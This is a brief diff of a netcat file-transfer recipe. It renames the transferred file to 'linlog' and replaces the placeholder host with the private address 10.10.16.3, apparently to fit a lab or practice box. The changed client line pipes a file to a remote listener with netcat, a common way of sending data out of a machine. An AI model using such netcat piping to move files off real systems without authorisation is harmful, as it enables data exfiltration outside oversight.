@@ -1,7 +1,7 @@
 On your server (A):
 
-nc -l -p 1234 -q 1 > something.zip < /dev/null
+nc -l -p 1234 -q 1 > linlog < /dev/null
 
 On your "sender client" (B):
 
-cat something.zip | netcat server.ip.here 1234
+cat linlog | netcat 10.10.16.3 1234
